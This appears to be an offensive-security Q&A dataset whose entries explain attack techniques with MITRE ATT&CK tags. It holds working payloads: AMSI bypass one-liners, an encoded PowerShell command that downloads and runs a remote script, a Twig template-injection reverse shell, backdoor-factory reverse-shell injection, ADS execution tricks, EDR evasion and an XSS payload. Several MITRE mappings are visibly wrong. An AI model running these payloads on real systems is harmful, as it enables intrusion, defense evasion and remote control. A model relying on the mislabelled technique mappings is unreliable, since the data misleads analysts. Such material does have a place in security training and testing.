A: The atftpd server can be used to set up a malicious TFTP server that could be leveraged in a supply chain attack. An attacker could configure atftpd with the `--daemon`, `--port`, and `--bind-address` options to run the server on a system under their control, and then use the `--mcast-addr` and `--mcast-port` options to enable multicast TFTP transfers. This could allow the attacker to intercept and potentially modify files being downloaded by victims. Version 0.8.0-3 of atftpd is being used in this example. MITRE References: MITRE ID is T1195, MITRE Name is: Supply Chain Compromise, and MITRE Tactics are: Initial Access, Execution.

## Q: How could an attacker use in.tftpd to perform a denial of service attack?
A: The in.tftpd server could potentially be used to perform a denial of service attack. An attacker could leverage options like `--tftpd-timeout`, `--retry-timeout`, and `--maxthread` to configure the server in a way that consumes excessive system resources, potentially causing the target system to become unresponsive. Additionally, the `--trace` option could be used to generate large log files that could fill up disk space. Version 0.8.0-3 of in.tftpd is being used in this example. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: How can you bypass AppLocker policies?
A: There are several ways to bypass AppLocker policies, including using writable folders like `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`, commonly trusted "LOLBAS" binaries, poorly written rules, and bypassing PowerShell executable locations. You can also use tools like ReflectivePick or SharpPick to execute PowerShell code and bypass AppLocker. MITRE References: MITRE ID is T1218, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Defense Evasion, Execution.

## Q: How can you bypass a Docker authorization plugin by identifying unchecked API endpoints or JSON attributes?
A: The sysadmin may have forgotten to restrict certain API endpoints or JSON attributes, such as "Binds", "HostConfig.Binds", "Mounts", or "HostConfig.Capabilities". You can craft requests to the Docker API to abuse these unchecked parameters and escalate privileges on the host. MITRE References: MITRE ID is T1646, MITRE Name is: Container API Abuse, and MITRE Tactics are: TA0004.

## Q: What is the ThreatCheck tool and how can it be used for AV evasion?
A: ThreatCheck is a tool that can be used to check which parts of a binary Windows Defender finds as malicious. It splits the file into multiple segments and tasks Defender to scan each one individually, allowing it to tell you exactly what are the flagged strings or bytes in your binary. This can help you identify what needs to be changed or obfuscated to evade detection. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can you use DLL Sideloading and DLL Proxying to bypass AV detection?
A: DLL Sideloading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. DLL Proxying forwards the calls a program makes from the proxy (and malicious) DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your payload. You can use tools like Siofra to find programs susceptible to DLL Sideloading and SharpDLLProxy to create the proxy DLL. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: What is the Freeze toolkit and how can it be used to bypass EDRs?
A: Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods. You can use Freeze to load and execute your shellcode in a stealthy manner. To use it, generate your shellcode, then run `./Freeze -I demon.bin -encrypt -O demon.exe` to create an encrypted executable that can bypass Windows Defender. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you use C# assembly reflection to bypass AV detection?
A: Loading C# binaries in memory is a great way to run post-exploitation tools without getting caught by AV. Since the payload will get loaded directly into memory without touching disk, you only need to worry about patching AMSI for the whole process. You can use techniques like "Fork&Run" to spawn a new sacrificial process and inject your malicious code, or "Inline" to inject the payload into its own process. Tools like InlineExecute-Assembly can help with this. MITRE References: MITRE ID is T1127, MITRE Name is: Loading Executable Code, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass SmartScreen and the Mark of the Web (MoTW) by packaging payloads in containers?
A: A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) cannot be applied to non NTFS volumes. The tool PackMyPayload can be used to package payloads into output containers like ISOs to evade SmartScreen and MoTW detection. MITRE References: MITRE ID is T1202, MITRE Name is: Indirect Command Execution, and MITRE Tactics are: Defense Evasion.

## Q: How can you target the GOT entries of libc to achieve code execution?
A: The **GOT of libc** is usually compiled with **partial RELRO**, making it a nice target for this supposing it's possible to figure out its address ([**ASLR**](/binary-exploitation/common-binary-protections-and-bypasses/aslr)).

Common functions of the libc are going to call **other internal functions** whose GOT could be overwritten in order to get code execution.

Find [**more information about this tachnique here**](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#1---targetting-libc-got-entries). MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004.

## Q: How can b374k be used to perform reconnaissance on a web application?
A: The b374k PHP shell (version 3.2.3) can be used to perform reconnaissance on web applications in several ways:

1. File Manager: The built-in file manager can be used to browse the web server's directory structure and view potentially sensitive files like configuration files, log files, and backup files.

2. Search: The search function can be used to search for files and directories, and to search file contents for sensitive information like credentials, API keys, or other potentially valuable data.

3. SQL Explorer: The SQL Explorer feature can be used to enumerate database information, list tables and columns, and potentially extract sensitive data from the database.

4. Packet Crafter: The Packet Crafter tool can be used to craft and send custom HTTP requests to the web application, which can be useful for identifying vulnerabilities or testing the application's behavior. MITRE References: MITRE ID is T1213, MITRE Name is: Data from Information Repositories, and MITRE Tactics are: Discovery.

## Q: How can b374k be used to execute malicious code on a web server?
A: The b374k PHP shell (version 3.2.3) can be used to execute malicious code on a web server in several ways:

1. Command Execution: The built-in command execution feature can be used to run arbitrary system commands on the web server, potentially allowing an attacker to gain further access or control.

2. Script Execution: The script execution feature can be used to run malicious scripts (such as PHP, Perl, Python, or Node.js code) on the web server, potentially leading to remote code execution.

3. Bind/Reverse Shell: The shell connectivity features can be used to establish a remote shell connection to the web server, granting the attacker direct access to the system. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can b374k be used to maintain persistent access to a compromised web server?
A: The b374k PHP shell (version 3.2.3) can be used to maintain persistent access to a compromised web server in several ways:

1. File Upload: The file upload feature can be used to upload malicious scripts or web shells to the web server, which can be used to regain access at a later time.

2. Backdoor: The shell connectivity features can be used to establish a reverse shell or bind shell, which can provide the attacker with persistent remote access to the system.

3. Database Connectivity: The database connectivity features can be used to store and retrieve malicious data or scripts, potentially allowing the attacker to maintain access even if the web server is restarted or the PHP shell is removed. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Persistence.

## Q: How can backdoor-factory be used to inject shellcode into an executable?
A: The backdoor-factory tool (version 3.4.2) allows you to inject predefined or user-defined shellcode into Windows or Linux executables. To use it, specify the binary to backdoor (-f), the connect-back IP (-H), the connect-back port (-P), and the shell to use (-s). For example, to backdoor the 'plink.exe' binary with a reverse shell payload:

root@kali:~# backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline
 MITRE References: MITRE ID is T1505, MITRE Name is: Firmware Corruption, and MITRE Tactics are: Defense Evasion, Persistence.

## Q: What are some techniques for executing arbitrary code through a vulnerability?
A: To execute arbitrary code, you can use techniques like stack-based shellcode, ret2syscall, or ret2libc. These techniques may require bypassing protections like ASLR, NX, and stack canaries. MITRE References: MITRE ID is T1106, MITRE Name is: execution, and MITRE Tactics are: Execution.

## Q: How do you execute commands or code from alternate data streams (ADS)?
A: To execute commands or code from alternate data streams (ADS), you can use the following examples:Adding content to ADS:`type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"``certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt`Extracting content from ADS:`expand c:\ads\file.txt:test.exe c:\temp\evil.exe`Executing ADS content:`wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'``powershell -ep bypass - < c:\temp:ttt` MITRE References: MITRE ID is T1564, MITRE Name is: Hide Artifacts, and MITRE Tactics are: TA0005.

## Q: How can you access the device shell on an iOS device?
A: To access the device shell, you can enable SSH access by installing the OpenSSH package post-jailbreak and connecting via `ssh root@<device_ip_address>`. Alternatively, you can use `iproxy` to map device ports for SSH connections over USB. On-device shell applications like NewTerm 2 also provide direct device interaction. MITRE References: MITRE ID is T1106, MITRE Name is: Execute Remote File, and MITRE Tactics are: TA0002.

## Q: How to download and execute a PowerShell script from the web in the background with AMSI Bypass?
A: To download and execute a PowerShell script from the web in the background with AMSI Bypass, you can use the following command:```Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=" ``` MITRE References: MITRE ID is T1059.001, MITRE Name is: Command and Scripting Interpreter: PowerShell, and MITRE Tactics are: Execution.

## Q: How to use base64 encoding to download and execute a PowerShell script from Kali Linux?
A: To use base64 encoding to download and execute a PowerShell script from Kali Linux, you can use the following commands:```kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0PS> powershell -EncodedCommand <Base64>``` MITRE References: MITRE ID is T1059.001, MITRE Name is: Command and Scripting Interpreter: PowerShell, and MITRE Tactics are: Execution.

## Q: How to bypass AMSI in PowerShell?
A: There are several ways to bypass AMSI in PowerShell:```# A Method[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1$A="5492868772801748688168747280728187173688878280688776828"$B="1173680867656877679866880867644817687416876797271"[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " " ).GetField([string](38..51|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " ",'NonPublic,Static').SetValue($null,$true)# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)```There are also other methods available, such as using API call hooking and SeDebug privileges. For more resources, check:* [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)* [Amsi Bypass on Windows 11 In 2023](https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6) [Github](https://github.com/senzee1984/Amsi_Bypass_In_2023) MITRE References: MITRE ID is T1562.001, MITRE Name is: Impair Defenses: Disable or Modify Tools, and MITRE Tactics are: Defense Evasion.

## Q: How can the ObjectDataProvider gadget be used to achieve RCE?
A: The ObjectDataProvider class allows to wrap an arbitrary object, use MethodParameters to set arbitrary parameters, and then use MethodName to call an arbitrary function of the arbitrary object declared using the arbitrary parameters. Therefore, the arbitrary object will execute a function with parameters while being deserialized. This can be used to achieve RCE by setting the MethodName to 'Start' and the MethodParameters to execute a program like 'calc.exe'. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution.

## Q: How can the Json.Net library be abused to achieve RCE using the ObjectDataProvider gadget?
A: The Json.Net library allows serializing and deserializing .NET objects. By crafting a JSON payload that contains an ObjectDataProvider instance with the MethodName set to 'Start' and the MethodParameters set to execute a program, the deserialization of this payload can lead to RCE. An example exploit using ysoserial.net can be found in the content. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution.

## Q: How can berate-ap be used to conduct wireless penetration testing?
A: The berate-ap tool in version 0.4.6 can be used to orchestrate rogue Wi-Fi access points for wireless penetration testing. Some key features include:- Creating a rogue access point with customizable SSID, password, and security settings- Enabling 'Mana' mode to respond affirmatively to all device access point probes- Capturing WPA/WPA2 handshakes for offline cracking- Intercepting EAP credentials using the 'Mana WPE' mode- Relaying MSCHAP authentication attempts between a rogue AP and a legitimate AP using the 'wpa_sycophant' option MITRE References: MITRE ID is T1587, MITRE Name is: Develop Capabilities, and MITRE Tactics are: Resource Development.

## Q: How can berate-ap be used to set up a rogue wireless access point for a man-in-the-middle attack?
A: With berate-ap version 0.4.6, you can set up a rogue wireless access point and enable the 'Mana' mode to respond affirmatively to all device access point probes. This can be used to conduct man-in-the-middle attacks by intercepting client traffic. Additionally, the 'wpa_sycophant' option can be used to relay MSCHAP authentication attempts between the rogue AP and a legitimate AP, allowing you to potentially authenticate to the legitimate AP using someone else's login attempt. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Credential Access, Defense Evasion.

## Q: How can berate-ap be used to capture wireless credentials during a penetration test?
A: In version 0.4.6, berate-ap supports several options for capturing wireless credentials:- The 'Mana WPE' mode can be used to intercept EAP credentials - The '--mana-wpa' option can be used to capture WPA/WPA2 handshakes for offline cracking- The '--mana-credout' option specifies the location of the output file for captured credentialsThese features can be useful during wireless penetration testing to obtain valid credentials for further exploitation. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can bettercap-ui be used to perform wireless attacks and credential harvesting?
A: Bettercap-ui version 1.3.0 can be used to perform wireless attacks and credential harvesting. The web UI provides options for 802.11 frame injection, deauthentication attacks, and KARMA attacks to trick victims into connecting to a rogue access point. It can also be used to sniff wireless traffic and capture login credentials and other sensitive information. MITRE References: MITRE ID is T1553, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can bettercap-ui be used to perform SSL/TLS downgrade attacks?
A: Bettercap-ui version 1.3.0 can be used to perform SSL/TLS downgrade attacks. The web UI provides options to perform HTTPS stripping and force victims to connect over HTTP instead of HTTPS, allowing the attacker to intercept and modify the traffic. This can be used to steal sensitive information like login credentials and cookies. MITRE References: MITRE ID is T1030, MITRE Name is: Data Transfer Size Limits, and MITRE Tactics are: Exfiltration.

## Q: How can bettercap be used to perform ARP spoofing attacks?
A: Bettercap version 2.32.0 can be used to perform ARP spoofing attacks using the 'arp.spoof' module. To use this, first set the target IP address and gateway IP address using the 'set arp.spoof.targets' and 'set arp.spoof.gateway' commands. Then, start the ARP spoofing attack with the 'arp.spoof on' command. This will allow you to intercept and manipulate network traffic between the target and the gateway. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can bettercap be used to conduct a man-in-the-middle (MITM) attack?
A: Bettercap version 2.32.0 can be used to conduct MITM attacks using the 'proxy' module. First, enable IP forwarding on the system running bettercap. Then, use the 'set https.proxy.address' and 'set http.proxy.address' commands to set the MITM proxy addresses. Finally, start the MITM attack with the 'proxy on' command. This will allow you to intercept and manipulate network traffic passing through the system. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: What is the best way to bypass a simple canary in a binary that forks child processes for each new connection?
A: The best way to bypass a simple canary is if the binary is a program **forking child processes every time you establish a new connection** (network service), because every time you connect to it **the same canary will be used**. Then, the best way to bypass the canary is just to **brute-force it char by char**, and you can figure out if the guessed canary byte was correct checking if the program has crashed or continues its regular flow. MITRE References: MITRE ID is T1546.005, MITRE Name is: Subvert Trust Controls: Executables Signed with Stolen Certificates, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you acquire Bitcoins anonymously?
A: Methods to acquire Bitcoins anonymously include cash transactions, using cash alternatives like gift cards, mining, and utilizing mixing services like CoinJoin and PayJoin. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: How can bluesnarfer v0.1 be used to gather information about a remote Bluetooth device?
A: To gather information about a remote Bluetooth device using bluesnarfer v0.1, you can use the following command:

```console
root@kali:~# bluesnarfer -b 20:C9:D0:43:4B:D8 -i
device name: ares
```

The `-b` option specifies the Bluetooth address of the remote device, and the `-i` option requests device information. This will display the device name. MITRE References: MITRE ID is T1185, MITRE Name is: Remote Device Discovery, and MITRE Tactics are: Reconnaissance.

## Q: How to get RCE (Remote Code Execution) in Bolt CMS?
A: After login as admin (go to /bot lo access the login prompt), you can get RCE in Bolt CMS:

* Select `Configuration` -> `View Configuration` -> `Main Configuration` or go the the URL path `/bolt/file-edit/config?file=/bolt/config.yaml`

	+ Check the value of theme

* Select `File management` -> `View & edit templates`

	+ Select the theme base found in the previous (`base-2021` in this case) step and select `index.twig`
	+ In my case this is in the URL path /bolt/file-edit/themes?file=/base-2021/index.twig
* Set your payload in this file via [template injection (Twig)](/pentesting-web/ssti-server-side-template-injection#twig-php), like: `{{['bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"']|filter('system')}}`

	+ And save changes

* Clear the cache in `Maintenance` -> `Clear the cache`
* Access again the page as a regular user, and the payload should be executed MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What tool can be used to write the U-boot image and push a modified firmware to gain root access?
A: Use `ubootwrite.py` to write the U-boot image and push a modified firmware to gain root access. MITRE References: MITRE ID is T1542, MITRE Name is: Pre-OS Boot, and MITRE Tactics are: Initial Access.

## Q: How can you set up a rogue DHCP server with malicious parameters for a device to ingest during a PXE boot?
A: Set up a rogue DHCP server with malicious parameters for a device to ingest during a PXE boot. Utilize tools like Metasploit's (MSF) DHCP auxiliary server. Modify the 'FILENAME' parameter with command injection commands such as 'a";/bin/sh;#' to test input validation for device startup procedures. MITRE References: MITRE ID is T1587, MITRE Name is: Develop Capabilities, and MITRE Tactics are: Resource Development.

## Q: How could braa version 0.82 be used to perform a mass SNMP scan and get system information from multiple devices?
A: To perform a mass SNMP scan and retrieve system information using braa version 0.82, you can use the following command:```braa public@192.168.1.1-192.168.1.255:.1.3.6.1.2.1.1.*```This will scan the IP range 192.168.1.1 to 192.168.1.255 using the 'public' SNMP community string and retrieve the following system information OIDs:- .1.3.6.1.2.1.1.1.0 (sysDescr)- .1.3.6.1.2.1.1.2.0 (sysObjectID)- .1.3.6.1.2.1.1.3.0 (sysUpTime)- .1.3.6.1.2.1.1.4.0 (sysContact)- .1.3.6.1.2.1.1.5.0 (sysName)This allows you to quickly gather information about the target systems, which could be useful during a penetration test or security assessment. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can a browser extension abuse permissions for webcam, geolocation, and clipboard access?
A: Websites have to ask for permission to access features like the webcam, microphone, or geolocation. But browser extensions only need to ask for these permissions once, after which they can access these features at any time without the user's knowledge. The extension can also access the clipboard contents without any explicit permission prompt. MITRE References: MITRE ID is T1113, MITRE Name is: Screen Capture, and MITRE Tactics are: Collection.

## Q: How can the DOM-based XSS vulnerability in the Steam Inventory Helper extension be exploited further using clickjacking?
A: The Chrome extension's manifest showcases an extensive `web_accessible_resources` policy, which includes the `/html/bookmarks.html` page. This page is prone to framing, thus vulnerable to clickjacking. This vulnerability is leveraged to frame the page within an attacker's site, overlaying it with DOM elements to redesign the interface deceptively. This manipulation leads victims to interact with the underlying extension unintentionally. MITRE References: MITRE ID is T1200, MITRE Name is: Hardware Additions, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can an XSS payload be injected into the Steam Inventory Helper extension through the Iframe source?
A: A malicious script can be executed on an adversary's page, modifying the `content` parameter of the Iframe's source to introduce an XSS payload. This is achieved by updating the Iframe's source to include a harmful script, such as: `setTimeout(() => { let targetFrame = document.querySelector("iframe").src; let baseURL = targetFrame.split('?')[0]; let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>"; let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`; document.querySelector("iframe").src = maliciousURL; }, 1000);` MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you use bruteforce-luks to crack the password of an encrypted LUKS volume?
A: To use bruteforce-luks to crack the password of a LUKS volume, you can run the following command:```bruteforce-luks <path to LUKS volume>```This will attempt to crack the password by trying all possible combinations based on the default settings (minimum length of 1, maximum length of 8, using the default character set). You can customize the options to improve the chances of success, such as:- `-b <string>`: Specify the beginning of the password - `-e <string>`: Specify the end of the password- `-l <length>`: Set the minimum password length - `-m <length>`: Set the maximum password length- `-s <string>`: Specify the character set to useFor example, to try passwords starting with "pass" and up to 12 characters long, you could use:```bruteforce-luks -b "pass" -m 12 <path to LUKS volume>```The program will continue trying passwords until the volume is decrypted or the user stops it. The version used in this example is 1.4.0. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use bruteforce-luks to perform a dictionary attack on an encrypted LUKS volume?
A: To use bruteforce-luks to perform a dictionary attack on a LUKS volume, you can use the `-f <file>` option to specify a file containing a list of passwords to try:```bruteforce-luks -f <password_file> <path to LUKS volume>```Replace `<password_file>` with the path to a file containing one password per line. The program will attempt to decrypt the volume using each password in the file.This can be more efficient than a brute-force approach if you have a good dictionary of likely passwords. Make sure the password file contains only valid password candidates to avoid wasting time on invalid entries.The version used in this example is 1.4.0. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How could you use bruteforce-salted-openssl to perform a password cracking attack on an encrypted file?
A: To perform a password cracking attack on an encrypted file using bruteforce-salted-openssl, you can use the following steps:

1. Specify the encrypted file as the first argument to the tool: `bruteforce-salted-openssl <filename>`
2. Use the `-f <file>` option to specify a file containing password candidates to try, one per line.
3. Optionally, use the `-l <length>` and `-m <length>` options to set the minimum and maximum password lengths to test.
4. Optionally, use the `-s <string>` option to specify the character set to use for generating password candidates.
5. Use the `-t <n>` option to set the number of threads to use for the attack.
6. The tool will automatically try decrypting the file with each password candidate and report when the correct password is found.

This tool can be used for security assessments, penetration testing, and digital forensics investigations involving encrypted files. Version 1.4.2 was used for this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How could you use bruteforce-salted-openssl to perform a password guessing attack on an encrypted file?
A: To perform a password guessing attack on an encrypted file using bruteforce-salted-openssl, you can follow these steps:1. Specify the encrypted file as the first argument to the tool: `bruteforce-salted-openssl <filename>`2. Use the `-f <file>` option to specify a file containing password candidates to try, one per line.3. Optionally, use the `-l <length>` and `-m <length>` options to set the minimum and maximum password lengths to test.4. Optionally, use the `-s <string>` option to specify the character set to use for generating password candidates.5. The tool will automatically try decrypting the file with each password candidate and report when the correct password is found.This approach can be useful for simulating real-world password guessing attacks during security assessments or penetration testing engagements. Version 1.4.2 was used for this example. MITRE References: MITRE ID is T1110.001, MITRE Name is: Brute Force: Password Guessing, and MITRE Tactics are: TA0006.

## Q: How could you use bruteforce-salted-openssl to perform a dictionary attack on an encrypted file?
A: To perform a dictionary attack on an encrypted file using bruteforce-salted-openssl, you can follow these steps:1. Specify the encrypted file as the first argument to the tool: `bruteforce-salted-openssl <filename>`2. Use the `-f <file>` option to specify a file containing password candidates to try, one per line.3. The tool will automatically try decrypting the file with each password from the dictionary file and report when the correct password is found.This approach can be useful for simulating real-world dictionary attacks during security assessments or penetration testing engagements. It is more efficient than a brute-force attack when you have access to a list of common or previously compromised passwords. Version 1.4.2 was used for this example. MITRE References: MITRE ID is T1110.001, MITRE Name is: Brute Force: Password Guessing, and MITRE Tactics are: TA0006.

## Q: How can bruteforce-wallet be used to recover a forgotten password for a Peercoin wallet?
A: bruteforce-wallet version 1.5.3 can be used to recover a forgotten password for a Peercoin wallet file. To do this, run the following command:

```
bruteforce-wallet -l <min_len> -m <max_len> -b <known_prefix> -e <known_suffix> -s <charset> <wallet_file>
```

This will try all possible password combinations within the specified length range, beginning with the known prefix and ending with the known suffix, using the provided character set. This can be effective if you have some information about the forgotten password, such as a partial phrase or character pattern. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you use brutespray version 1.8.1 to automate brute-force attacks against services discovered by Nmap?
A: To use brutespray 1.8.1 to automate brute-force attacks, you can follow these steps:1. Run Nmap to discover network services: `nmap -sV -oA nas nas.example.com`2. Pass the Nmap GNMAP output file to brutespray: `brutespray --file nas.gnmap --threads 3 --hosts 1`3. Brutespray will parse the Nmap results and automatically brute-force the discovered services using Medusa with default credentials.4. Any successful logins will be saved to the directory specified with the --output option.This automates the process of finding services and attempting brute-force attacks against them, saving time and effort compared to manual testing. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can I search for default credentials of a technology?
A: You can search in Google for default credentials of the technology that is being used, or try these links:

* [https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [http://www.phenoelit.org/dpl/dpl.html](http://www.phenoelit.org/dpl/dpl.html)
* [http://www.vulnerabilityassessment.co.uk/passwordsC.htm](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [https://192-168-1-1ip.mobi/default-router-passwords-list/](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)
* [https://bizuns.com/default-passwords-list](https://bizuns.com/default-passwords-list)
* [https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [https://github.com/Dormidera/WordList-Compendium](https://github.com/Dormidera/WordList-Compendium)
* [https://www.cirt.net/passwords](https://www.cirt.net/passwords)
* [http://www.passwordsdatabase.com/](http://www.passwordsdatabase.com)
* [https://many-passwords.github.io/](https://many-passwords.github.io)
* [https://theinfocentric.com/](https://theinfocentric.com/) MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Credential Access, Initial Access.

## Q: How can I try default credentials for the IRC service?
A: You can try the following:```nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What are some common techniques for enumerating and abusing AWS S3 buckets?
A: Some common techniques for enumerating and abusing AWS S3 buckets include:- Guessing bucket names using common patterns or wordlists- Checking for publicly accessible buckets using tools like `s3scanner`- Checking for bucket misconfigurations that allow read/write access- Downloading and analyzing the contents of accessible buckets- Uploading malicious files to buckets with write access- Using bucket permissions to gain additional access or privileges MITRE References: MITRE ID is T1583.002, MITRE Name is: Acquire Infrastructure: Obtain Domains, and MITRE Tactics are: Resource Development.

## Q: What are some common techniques for enumerating and abusing AWS Lambda functions?
A: Some common techniques for enumerating and abusing AWS Lambda functions include:- Listing all Lambda functions in an AWS account using the `aws lambda list-functions` command- Checking the permissions of Lambda functions using the `aws lambda get-policy` command- Invoking Lambda functions with different payloads to check for vulnerabilities or escalate privileges- Modifying the code of Lambda functions to gain additional access or perform malicious actions- Triggering Lambda functions through various AWS services or API calls to achieve specific objectives MITRE References: MITRE ID is T1087.001, MITRE Name is: Account Discovery: Cloud Account, and MITRE Tactics are: Discovery.

## Q: How can you use bulk-extractor to find potential credit card numbers in a disk image?
A: To find potential credit card numbers in a disk image using bulk-extractor, you can run the following command:root@kali:~# bulk_extractor -o output_dir disk_image.imgThis will scan the disk image and output the found credit card numbers (and other features) to the 'output_dir' directory. You can then inspect the 'ccn.txt' file in the output directory to view the potential credit card numbers discovered. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: How can bully be used to perform a WPS brute-force attack?
